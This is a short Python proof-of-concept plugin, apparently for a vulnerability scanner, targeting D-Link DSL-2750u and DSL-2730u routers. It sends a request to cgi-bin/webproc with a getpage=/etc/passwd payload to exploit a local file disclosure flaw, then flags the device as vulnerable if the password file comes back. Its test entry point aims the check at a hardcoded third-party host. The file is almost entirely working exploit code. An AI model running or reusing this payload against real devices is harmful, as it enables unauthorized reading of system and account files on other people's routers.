from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__author__= 'K0thony'
#Exploit Tittle: Dlink DSL-2750u and DSL-2730u - Authenticated Local File Disclosure
#Refer:https://www.exploit-db.com/exploits/37516/
import urlparse

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd'
        target = arg + payload
        
        code, head, res, body, _ = curl.curl2(target)
        if code == 200 and '/root:/bin/bash' in res:
            output(arg + 'D-Link 2750u / 2730u Local File Disclosure',result,'hole')
    
    

        del curl
        return result


def output(url,result,label):
    info = url + '  dlink  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='fileread Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/www/www_745461f9306787f982cc186373fb3d15.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__': 
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_745461f9306787f982cc186373fb3d15.py
#/root/github/poccreate/codesrc/exp-1073.py